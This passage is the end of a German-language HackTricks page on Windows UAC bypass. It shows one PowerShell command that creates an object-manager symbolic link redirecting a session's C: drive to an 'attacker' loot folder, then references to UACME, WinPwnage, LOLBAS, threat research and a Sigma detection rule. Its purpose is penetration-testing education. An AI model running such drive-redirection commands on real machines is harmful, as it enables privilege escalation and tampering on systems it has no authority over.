New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Funktionsweise der Benutzerkontensteuerung](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Sammlung von UAC-Umgehungstechniken](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Kompatibilitätsscanner und Launcher für UAC-Umgehungen](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI verwendet KI zur Generierung von PowerShell-Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Ausnutzung eines 0-Day gegen Ziele südostasiatischer Regierungen](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Umgehung des Windows-Administratorschutzes](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC-Umgehung mithilfe der SilentCleanup-Aufgabe](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
{{#include ../../banners/hacktricks-training.md}}
